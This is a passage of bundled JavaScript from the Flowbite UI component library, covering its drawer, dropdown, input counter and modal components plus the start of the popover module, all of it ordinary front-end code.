                              inactive: ["-translate-x-full"]
                            };
                          case "bottom-edge":
                            return {
                              base: ["left-0", "top-0"],
                              active: ["transform-none"],
                              inactive: ["translate-y-full", this._options.edgeOffset]
                            };
                          default:
                            return {
                              base: ["left-0", "top-0"],
                              active: ["transform-none"],
                              inactive: ["-translate-x-full"]
                            };
                        }
                      };
                      Drawer2.prototype.isHidden = function() {
                        return !this._visible;
                      };
                      Drawer2.prototype.isVisible = function() {
                        return this._visible;
                      };
                      Drawer2.prototype.addEventListenerInstance = function(element, type, handler) {
                        this._eventListenerInstances.push({
                          element,
                          type,
                          handler
                        });
                      };
                      Drawer2.prototype.removeAllEventListenerInstances = function() {
                        this._eventListenerInstances.map(function(eventListenerInstance) {
                          eventListenerInstance.element.removeEventListener(eventListenerInstance.type, eventListenerInstance.handler);
                        });
                        this._eventListenerInstances = [];
                      };
                      Drawer2.prototype.getAllEventListenerInstances = function() {
                        return this._eventListenerInstances;
                      };
                      return Drawer2;
                    }()
                  );
                  function initDrawers() {
                    document.querySelectorAll("[data-drawer-target]").forEach(function($triggerEl) {
                      var drawerId = $triggerEl.getAttribute("data-drawer-target");
                      var $drawerEl = document.getElementById(drawerId);
                      if ($drawerEl) {
                        var placement = $triggerEl.getAttribute("data-drawer-placement");
                        var bodyScrolling = $triggerEl.getAttribute("data-drawer-body-scrolling");
                        var backdrop = $triggerEl.getAttribute("data-drawer-backdrop");
                        var edge = $triggerEl.getAttribute("data-drawer-edge");
                        var edgeOffset = $triggerEl.getAttribute("data-drawer-edge-offset");
                        new Drawer($drawerEl, {
                          placement: placement ? placement : Default.placement,
                          bodyScrolling: bodyScrolling ? bodyScrolling === "true" ? true : false : Default.bodyScrolling,
                          backdrop: backdrop ? backdrop === "true" ? true : false : Default.backdrop,
                          edge: edge ? edge === "true" ? true : false : Default.edge,
                          edgeOffset: edgeOffset ? edgeOffset : Default.edgeOffset
                        });
                      } else {
                        console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
                      }
                    });
                    document.querySelectorAll("[data-drawer-toggle]").forEach(function($triggerEl) {
                      var drawerId = $triggerEl.getAttribute("data-drawer-toggle");
                      var $drawerEl = document.getElementById(drawerId);
                      if ($drawerEl) {
                        var drawer_1 = instances_1.default.getInstance("Drawer", drawerId);
                        if (drawer_1) {
                          var toggleDrawer = function() {
                            drawer_1.toggle();
                          };
                          $triggerEl.addEventListener("click", toggleDrawer);
                          drawer_1.addEventListenerInstance($triggerEl, "click", toggleDrawer);
                        } else {
                          console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
                        }
                      } else {
                        console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
                      }
                    });
                    document.querySelectorAll("[data-drawer-dismiss], [data-drawer-hide]").forEach(function($triggerEl) {
                      var drawerId = $triggerEl.getAttribute("data-drawer-dismiss") ? $triggerEl.getAttribute("data-drawer-dismiss") : $triggerEl.getAttribute("data-drawer-hide");
                      var $drawerEl = document.getElementById(drawerId);
                      if ($drawerEl) {
                        var drawer_2 = instances_1.default.getInstance("Drawer", drawerId);
                        if (drawer_2) {
                          var hideDrawer = function() {
                            drawer_2.hide();
                          };
                          $triggerEl.addEventListener("click", hideDrawer);
                          drawer_2.addEventListenerInstance($triggerEl, "click", hideDrawer);
                        } else {
                          console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
                        }
                      } else {
                        console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id"));
                      }
                    });
                    document.querySelectorAll("[data-drawer-show]").forEach(function($triggerEl) {
                      var drawerId = $triggerEl.getAttribute("data-drawer-show");
                      var $drawerEl = document.getElementById(drawerId);
                      if ($drawerEl) {
                        var drawer_3 = instances_1.default.getInstance("Drawer", drawerId);
                        if (drawer_3) {
                          var showDrawer = function() {
                            drawer_3.show();
                          };
                          $triggerEl.addEventListener("click", showDrawer);
                          drawer_3.addEventListenerInstance($triggerEl, "click", showDrawer);
                        } else {
                          console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
                        }
                      } else {
                        console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
                      }
                    });
                  }
                  exports3.initDrawers = initDrawers;
                  if (typeof window !== "undefined") {
                    window.Drawer = Drawer;
                    window.initDrawers = initDrawers;
                  }
                  exports3["default"] = Drawer;
                }
              ),
              /***/
              316: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  var __spreadArray = this && this.__spreadArray || function(to, from, pack) {
                    if (pack || arguments.length === 2)
                      for (var i = 0, l = from.length, ar; i < l; i++) {
                        if (ar || !(i in from)) {
                          if (!ar)
                            ar = Array.prototype.slice.call(from, 0, i);
                          ar[i] = from[i];
                        }
                      }
                    return to.concat(ar || Array.prototype.slice.call(from));
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initDropdowns = void 0;
                  var core_1 = __webpack_require__2(853);
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    placement: "bottom",
                    triggerType: "click",
                    offsetSkidding: 0,
                    offsetDistance: 10,
                    delay: 300,
                    ignoreClickOutsideClass: false,
                    onShow: function() {
                    },
                    onHide: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Dropdown = (
                    /** @class */
                    function() {
                      function Dropdown2(targetElement, triggerElement, options, instanceOptions) {
                        if (targetElement === void 0) {
                          targetElement = null;
                        }
                        if (triggerElement === void 0) {
                          triggerElement = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetElement.id;
                        this._targetEl = targetElement;
                        this._triggerEl = triggerElement;
                        this._options = __assign(__assign({}, Default), options);
                        this._popperInstance = null;
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Dropdown", this, this._instanceId, instanceOptions.override);
                      }
                      Dropdown2.prototype.init = function() {
                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          this._popperInstance = this._createPopperInstance();
                          this._setupEventListeners();
                          this._initialized = true;
                        }
                      };
                      Dropdown2.prototype.destroy = function() {
                        var _this = this;
                        var triggerEvents = this._getTriggerEvents();
                        if (this._options.triggerType === "click") {
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._clickHandler);
                          });
                        }
                        if (this._options.triggerType === "hover") {
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._hoverShowTriggerElHandler);
                            _this._targetEl.removeEventListener(ev, _this._hoverShowTargetElHandler);
                          });
                          triggerEvents.hideEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._hoverHideHandler);
                            _this._targetEl.removeEventListener(ev, _this._hoverHideHandler);
                          });
                        }
                        this._popperInstance.destroy();
                        this._initialized = false;
                      };
                      Dropdown2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Dropdown", this._instanceId);
                      };
                      Dropdown2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Dropdown2.prototype._setupEventListeners = function() {
                        var _this = this;
                        var triggerEvents = this._getTriggerEvents();
                        this._clickHandler = function() {
                          _this.toggle();
                        };
                        if (this._options.triggerType === "click") {
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.addEventListener(ev, _this._clickHandler);
                          });
                        }
                        this._hoverShowTriggerElHandler = function(ev) {
                          if (ev.type === "click") {
                            _this.toggle();
                          } else {
                            setTimeout(function() {
                              _this.show();
                            }, _this._options.delay);
                          }
                        };
                        this._hoverShowTargetElHandler = function() {
                          _this.show();
                        };
                        this._hoverHideHandler = function() {
                          setTimeout(function() {
                            if (!_this._targetEl.matches(":hover")) {
                              _this.hide();
                            }
                          }, _this._options.delay);
                        };
                        if (this._options.triggerType === "hover") {
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.addEventListener(ev, _this._hoverShowTriggerElHandler);
                            _this._targetEl.addEventListener(ev, _this._hoverShowTargetElHandler);
                          });
                          triggerEvents.hideEvents.forEach(function(ev) {
                            _this._triggerEl.addEventListener(ev, _this._hoverHideHandler);
                            _this._targetEl.addEventListener(ev, _this._hoverHideHandler);
                          });
                        }
                      };
                      Dropdown2.prototype._createPopperInstance = function() {
                        return (0, core_1.createPopper)(this._triggerEl, this._targetEl, {
                          placement: this._options.placement,
                          modifiers: [
                            {
                              name: "offset",
                              options: {
                                offset: [
                                  this._options.offsetSkidding,
                                  this._options.offsetDistance
                                ]
                              }
                            }
                          ]
                        });
                      };
                      Dropdown2.prototype._setupClickOutsideListener = function() {
                        var _this = this;
                        this._clickOutsideEventListener = function(ev) {
                          _this._handleClickOutside(ev, _this._targetEl);
                        };
                        document.body.addEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Dropdown2.prototype._removeClickOutsideListener = function() {
                        document.body.removeEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Dropdown2.prototype._handleClickOutside = function(ev, targetEl) {
                        var clickedEl = ev.target;
                        var ignoreClickOutsideClass = this._options.ignoreClickOutsideClass;
                        var isIgnored = false;
                        if (ignoreClickOutsideClass) {
                          var ignoredClickOutsideEls = document.querySelectorAll(".".concat(ignoreClickOutsideClass));
                          ignoredClickOutsideEls.forEach(function(el) {
                            if (el.contains(clickedEl)) {
                              isIgnored = true;
                              return;
                            }
                          });
                        }
                        if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && !isIgnored && this.isVisible()) {
                          this.hide();
                        }
                      };
                      Dropdown2.prototype._getTriggerEvents = function() {
                        switch (this._options.triggerType) {
                          case "hover":
                            return {
                              showEvents: ["mouseenter", "click"],
                              hideEvents: ["mouseleave"]
                            };
                          case "click":
                            return {
                              showEvents: ["click"],
                              hideEvents: []
                            };
                          case "none":
                            return {
                              showEvents: [],
                              hideEvents: []
                            };
                          default:
                            return {
                              showEvents: ["click"],
                              hideEvents: []
                            };
                        }
                      };
                      Dropdown2.prototype.toggle = function() {
                        if (this.isVisible()) {
                          this.hide();
                        } else {
                          this.show();
                        }
                        this._options.onToggle(this);
                      };
                      Dropdown2.prototype.isVisible = function() {
                        return this._visible;
                      };
                      Dropdown2.prototype.show = function() {
                        this._targetEl.classList.remove("hidden");
                        this._targetEl.classList.add("block");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: true }
                          ], false) });
                        });
                        this._setupClickOutsideListener();
                        this._popperInstance.update();
                        this._visible = true;
                        this._options.onShow(this);
                      };
                      Dropdown2.prototype.hide = function() {
                        this._targetEl.classList.remove("block");
                        this._targetEl.classList.add("hidden");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: false }
                          ], false) });
                        });
                        this._visible = false;
                        this._removeClickOutsideListener();
                        this._options.onHide(this);
                      };
                      return Dropdown2;
                    }()
                  );
                  function initDropdowns() {
                    document.querySelectorAll("[data-dropdown-toggle]").forEach(function($triggerEl) {
                      var dropdownId = $triggerEl.getAttribute("data-dropdown-toggle");
                      var $dropdownEl = document.getElementById(dropdownId);
                      if ($dropdownEl) {
                        var placement = $triggerEl.getAttribute("data-dropdown-placement");
                        var offsetSkidding = $triggerEl.getAttribute("data-dropdown-offset-skidding");
                        var offsetDistance = $triggerEl.getAttribute("data-dropdown-offset-distance");
                        var triggerType = $triggerEl.getAttribute("data-dropdown-trigger");
                        var delay = $triggerEl.getAttribute("data-dropdown-delay");
                        var ignoreClickOutsideClass = $triggerEl.getAttribute("data-dropdown-ignore-click-outside-class");
                        new Dropdown($dropdownEl, $triggerEl, {
                          placement: placement ? placement : Default.placement,
                          triggerType: triggerType ? triggerType : Default.triggerType,
                          offsetSkidding: offsetSkidding ? parseInt(offsetSkidding) : Default.offsetSkidding,
                          offsetDistance: offsetDistance ? parseInt(offsetDistance) : Default.offsetDistance,
                          delay: delay ? parseInt(delay) : Default.delay,
                          ignoreClickOutsideClass: ignoreClickOutsideClass ? ignoreClickOutsideClass : Default.ignoreClickOutsideClass
                        });
                      } else {
                        console.error('The dropdown element with id "'.concat(dropdownId, '" does not exist. Please check the data-dropdown-toggle attribute.'));
                      }
                    });
                  }
                  exports3.initDropdowns = initDropdowns;
                  if (typeof window !== "undefined") {
                    window.Dropdown = Dropdown;
                    window.initDropdowns = initDropdowns;
                  }
                  exports3["default"] = Dropdown;
                }
              ),
              /***/
              311: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initFlowbite = void 0;
                  var accordion_1 = __webpack_require__2(902);
                  var carousel_1 = __webpack_require__2(33);
                  var collapse_1 = __webpack_require__2(922);
                  var dial_1 = __webpack_require__2(556);
                  var dismiss_1 = __webpack_require__2(791);
                  var drawer_1 = __webpack_require__2(340);
                  var dropdown_1 = __webpack_require__2(316);
                  var input_counter_1 = __webpack_require__2(656);
                  var modal_1 = __webpack_require__2(16);
                  var popover_1 = __webpack_require__2(903);
                  var tabs_1 = __webpack_require__2(247);
                  var tooltip_1 = __webpack_require__2(671);
                  function initFlowbite() {
                    (0, accordion_1.initAccordions)();
                    (0, collapse_1.initCollapses)();
                    (0, carousel_1.initCarousels)();
                    (0, dismiss_1.initDismisses)();
                    (0, dropdown_1.initDropdowns)();
                    (0, modal_1.initModals)();
                    (0, drawer_1.initDrawers)();
                    (0, tabs_1.initTabs)();
                    (0, tooltip_1.initTooltips)();
                    (0, popover_1.initPopovers)();
                    (0, dial_1.initDials)();
                    (0, input_counter_1.initInputCounters)();
                  }
                  exports3.initFlowbite = initFlowbite;
                  if (typeof window !== "undefined") {
                    window.initFlowbite = initFlowbite;
                  }
                }
              ),
              /***/
              656: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initInputCounters = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    minValue: null,
                    maxValue: null,
                    onIncrement: function() {
                    },
                    onDecrement: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var InputCounter = (
                    /** @class */
                    function() {
                      function InputCounter2(targetEl, incrementEl, decrementEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (incrementEl === void 0) {
                          incrementEl = null;
                        }
                        if (decrementEl === void 0) {
                          decrementEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._incrementEl = incrementEl;
                        this._decrementEl = decrementEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("InputCounter", this, this._instanceId, instanceOptions.override);
                      }
                      InputCounter2.prototype.init = function() {
                        var _this = this;
                        if (this._targetEl && !this._initialized) {
                          this._inputHandler = function(event) {
                            {
                              var target = event.target;
                              if (!/^\d*$/.test(target.value)) {
                                target.value = target.value.replace(/[^\d]/g, "");
                              }
                              if (_this._options.maxValue !== null && parseInt(target.value) > _this._options.maxValue) {
                                target.value = _this._options.maxValue.toString();
                              }
                              if (_this._options.minValue !== null && parseInt(target.value) < _this._options.minValue) {
                                target.value = _this._options.minValue.toString();
                              }
                            }
                          };
                          this._incrementClickHandler = function() {
                            _this.increment();
                          };
                          this._decrementClickHandler = function() {
                            _this.decrement();
                          };
                          this._targetEl.addEventListener("input", this._inputHandler);
                          if (this._incrementEl) {
                            this._incrementEl.addEventListener("click", this._incrementClickHandler);
                          }
                          if (this._decrementEl) {
                            this._decrementEl.addEventListener("click", this._decrementClickHandler);
                          }
                          this._initialized = true;
                        }
                      };
                      InputCounter2.prototype.destroy = function() {
                        if (this._targetEl && this._initialized) {
                          this._targetEl.removeEventListener("input", this._inputHandler);
                          if (this._incrementEl) {
                            this._incrementEl.removeEventListener("click", this._incrementClickHandler);
                          }
                          if (this._decrementEl) {
                            this._decrementEl.removeEventListener("click", this._decrementClickHandler);
                          }
                          this._initialized = false;
                        }
                      };
                      InputCounter2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("InputCounter", this._instanceId);
                      };
                      InputCounter2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      InputCounter2.prototype.getCurrentValue = function() {
                        return parseInt(this._targetEl.value) || 0;
                      };
                      InputCounter2.prototype.increment = function() {
                        if (this._options.maxValue !== null && this.getCurrentValue() >= this._options.maxValue) {
                          return;
                        }
                        this._targetEl.value = (this.getCurrentValue() + 1).toString();
                        this._options.onIncrement(this);
                      };
                      InputCounter2.prototype.decrement = function() {
                        if (this._options.minValue !== null && this.getCurrentValue() <= this._options.minValue) {
                          return;
                        }
                        this._targetEl.value = (this.getCurrentValue() - 1).toString();
                        this._options.onDecrement(this);
                      };
                      return InputCounter2;
                    }()
                  );
                  function initInputCounters() {
                    document.querySelectorAll("[data-input-counter]").forEach(function($targetEl) {
                      var targetId = $targetEl.id;
                      var $incrementEl = document.querySelector('[data-input-counter-increment="' + targetId + '"]');
                      var $decrementEl = document.querySelector('[data-input-counter-decrement="' + targetId + '"]');
                      var minValue = $targetEl.getAttribute("data-input-counter-min");
                      var maxValue = $targetEl.getAttribute("data-input-counter-max");
                      if ($targetEl) {
                        if (!instances_1.default.instanceExists("InputCounter", $targetEl.getAttribute("id"))) {
                          new InputCounter($targetEl, $incrementEl ? $incrementEl : null, $decrementEl ? $decrementEl : null, {
                            minValue: minValue ? parseInt(minValue) : null,
                            maxValue: maxValue ? parseInt(maxValue) : null
                          });
                        }
                      } else {
                        console.error('The target element with id "'.concat(targetId, '" does not exist. Please check the data-input-counter attribute.'));
                      }
                    });
                  }
                  exports3.initInputCounters = initInputCounters;
                  if (typeof window !== "undefined") {
                    window.InputCounter = InputCounter;
                    window.initInputCounters = initInputCounters;
                  }
                  exports3["default"] = InputCounter;
                }
              ),
              /***/
              16: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initModals = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    placement: "center",
                    backdropClasses: "bg-gray-900/50 dark:bg-gray-900/80 fixed inset-0 z-40",
                    backdrop: "dynamic",
                    closable: true,
                    onHide: function() {
                    },
                    onShow: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Modal = (
                    /** @class */
                    function() {
                      function Modal2(targetEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._eventListenerInstances = [];
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._isHidden = true;
                        this._backdropEl = null;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Modal", this, this._instanceId, instanceOptions.override);
                      }
                      Modal2.prototype.init = function() {
                        var _this = this;
                        if (this._targetEl && !this._initialized) {
                          this._getPlacementClasses().map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                          this._initialized = true;
                        }
                      };
                      Modal2.prototype.destroy = function() {
                        if (this._initialized) {
                          this.removeAllEventListenerInstances();
                          this._destroyBackdropEl();
                          this._initialized = false;
                        }
                      };
                      Modal2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Modal", this._instanceId);
                      };
                      Modal2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Modal2.prototype._createBackdrop = function() {
                        var _a;
                        if (this._isHidden) {
                          var backdropEl = document.createElement("div");
                          backdropEl.setAttribute("modal-backdrop", "");
                          (_a = backdropEl.classList).add.apply(_a, this._options.backdropClasses.split(" "));
                          document.querySelector("body").append(backdropEl);
                          this._backdropEl = backdropEl;
                        }
                      };
                      Modal2.prototype._destroyBackdropEl = function() {
                        if (!this._isHidden) {
                          document.querySelector("[modal-backdrop]").remove();
                        }
                      };
                      Modal2.prototype._setupModalCloseEventListeners = function() {
                        var _this = this;
                        if (this._options.backdrop === "dynamic") {
                          this._clickOutsideEventListener = function(ev) {
                            _this._handleOutsideClick(ev.target);
                          };
                          this._targetEl.addEventListener("click", this._clickOutsideEventListener, true);
                        }
                        this._keydownEventListener = function(ev) {
                          if (ev.key === "Escape") {
                            _this.hide();
                          }
                        };
                        document.body.addEventListener("keydown", this._keydownEventListener, true);
                      };
                      Modal2.prototype._removeModalCloseEventListeners = function() {
                        if (this._options.backdrop === "dynamic") {
                          this._targetEl.removeEventListener("click", this._clickOutsideEventListener, true);
                        }
                        document.body.removeEventListener("keydown", this._keydownEventListener, true);
                      };
                      Modal2.prototype._handleOutsideClick = function(target) {
                        if (target === this._targetEl || target === this._backdropEl && this.isVisible()) {
                          this.hide();
                        }
                      };
                      Modal2.prototype._getPlacementClasses = function() {
                        switch (this._options.placement) {
                          case "top-left":
                            return ["justify-start", "items-start"];
                          case "top-center":
                            return ["justify-center", "items-start"];
                          case "top-right":
                            return ["justify-end", "items-start"];
                          case "center-left":
                            return ["justify-start", "items-center"];
                          case "center":
                            return ["justify-center", "items-center"];
                          case "center-right":
                            return ["justify-end", "items-center"];
                          case "bottom-left":
                            return ["justify-start", "items-end"];
                          case "bottom-center":
                            return ["justify-center", "items-end"];
                          case "bottom-right":
                            return ["justify-end", "items-end"];
                          default:
                            return ["justify-center", "items-center"];
                        }
                      };
                      Modal2.prototype.toggle = function() {
                        if (this._isHidden) {
                          this.show();
                        } else {
                          this.hide();
                        }
                        this._options.onToggle(this);
                      };
                      Modal2.prototype.show = function() {
                        if (this.isHidden) {
                          this._targetEl.classList.add("flex");
                          this._targetEl.classList.remove("hidden");
                          this._targetEl.setAttribute("aria-modal", "true");
                          this._targetEl.setAttribute("role", "dialog");
                          this._targetEl.removeAttribute("aria-hidden");
                          this._createBackdrop();
                          this._isHidden = false;
                          if (this._options.closable) {
                            this._setupModalCloseEventListeners();
                          }
                          document.body.classList.add("overflow-hidden");
                          this._options.onShow(this);
                        }
                      };
                      Modal2.prototype.hide = function() {
                        if (this.isVisible) {
                          this._targetEl.classList.add("hidden");
                          this._targetEl.classList.remove("flex");
                          this._targetEl.setAttribute("aria-hidden", "true");
                          this._targetEl.removeAttribute("aria-modal");
                          this._targetEl.removeAttribute("role");
                          this._destroyBackdropEl();
                          this._isHidden = true;
                          document.body.classList.remove("overflow-hidden");
                          if (this._options.closable) {
                            this._removeModalCloseEventListeners();
                          }
                          this._options.onHide(this);
                        }
                      };
                      Modal2.prototype.isVisible = function() {
                        return !this._isHidden;
                      };
                      Modal2.prototype.isHidden = function() {
                        return this._isHidden;
                      };
                      Modal2.prototype.addEventListenerInstance = function(element, type, handler) {
                        this._eventListenerInstances.push({
                          element,
                          type,
                          handler
                        });
                      };
                      Modal2.prototype.removeAllEventListenerInstances = function() {
                        this._eventListenerInstances.map(function(eventListenerInstance) {
                          eventListenerInstance.element.removeEventListener(eventListenerInstance.type, eventListenerInstance.handler);
                        });
                        this._eventListenerInstances = [];
                      };
                      Modal2.prototype.getAllEventListenerInstances = function() {
                        return this._eventListenerInstances;
                      };
                      return Modal2;
                    }()
                  );
                  function initModals() {
                    document.querySelectorAll("[data-modal-target]").forEach(function($triggerEl) {
                      var modalId = $triggerEl.getAttribute("data-modal-target");
                      var $modalEl = document.getElementById(modalId);
                      if ($modalEl) {
                        var placement = $modalEl.getAttribute("data-modal-placement");
                        var backdrop = $modalEl.getAttribute("data-modal-backdrop");
                        new Modal($modalEl, {
                          placement: placement ? placement : Default.placement,
                          backdrop: backdrop ? backdrop : Default.backdrop
                        });
                      } else {
                        console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-target attribute points to the correct modal id?."));
                      }
                    });
                    document.querySelectorAll("[data-modal-toggle]").forEach(function($triggerEl) {
                      var modalId = $triggerEl.getAttribute("data-modal-toggle");
                      var $modalEl = document.getElementById(modalId);
                      if ($modalEl) {
                        var modal_1 = instances_1.default.getInstance("Modal", modalId);
                        if (modal_1) {
                          var toggleModal = function() {
                            modal_1.toggle();
                          };
                          $triggerEl.addEventListener("click", toggleModal);
                          modal_1.addEventListenerInstance($triggerEl, "click", toggleModal);
                        } else {
                          console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
                        }
                      } else {
                        console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-toggle attribute points to the correct modal id?"));
                      }
                    });
                    document.querySelectorAll("[data-modal-show]").forEach(function($triggerEl) {
                      var modalId = $triggerEl.getAttribute("data-modal-show");
                      var $modalEl = document.getElementById(modalId);
                      if ($modalEl) {
                        var modal_2 = instances_1.default.getInstance("Modal", modalId);
                        if (modal_2) {
                          var showModal = function() {
                            modal_2.show();
                          };
                          $triggerEl.addEventListener("click", showModal);
                          modal_2.addEventListenerInstance($triggerEl, "click", showModal);
                        } else {
                          console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
                        }
                      } else {
                        console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-show attribute points to the correct modal id?"));
                      }
                    });
                    document.querySelectorAll("[data-modal-hide]").forEach(function($triggerEl) {
                      var modalId = $triggerEl.getAttribute("data-modal-hide");
                      var $modalEl = document.getElementById(modalId);
                      if ($modalEl) {
                        var modal_3 = instances_1.default.getInstance("Modal", modalId);
                        if (modal_3) {
                          var hideModal = function() {
                            modal_3.hide();
                          };
                          $triggerEl.addEventListener("click", hideModal);
                          modal_3.addEventListenerInstance($triggerEl, "click", hideModal);
                        } else {
                          console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
                        }
                      } else {
                        console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-hide attribute points to the correct modal id?"));
                      }
                    });
                  }
                  exports3.initModals = initModals;
                  if (typeof window !== "undefined") {
                    window.Modal = Modal;
                    window.initModals = initModals;
                  }
                  exports3["default"] = Modal;
                }
              ),
              /***/
              903: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  var __spreadArray = this && this.__spreadArray || function(to, from, pack) {
                    if (pack || arguments.length === 2)
                      for (var i = 0, l = from.length, ar; i < l; i++) {
                        if (ar || !(i in from)) {
                          if (!ar)
                            ar = Array.prototype.slice.call(from, 0, i);
                          ar[i] = from[i];
                        }
                      }
                    return to.concat(ar || Array.prototype.slice.call(from));
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initPopovers = void 0;
                  var core_1 = __webpack_require__2(853);
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    placement: "top",
                    offset: 10,
                    triggerType: "hover",
                    onShow: function() {
                    },
                    onHide: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Popover = (
                    /** @class */
                    function() {
                      function Popover2(targetEl, triggerEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (triggerEl === void 0) {
                          triggerEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._triggerEl = triggerEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._popperInstance = null;
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Popover", this, instanceOptions.id ? instanceOptions.id : this._targetEl.id, instanceOptions.override);
                      }
                      Popover2.prototype.init = function() {
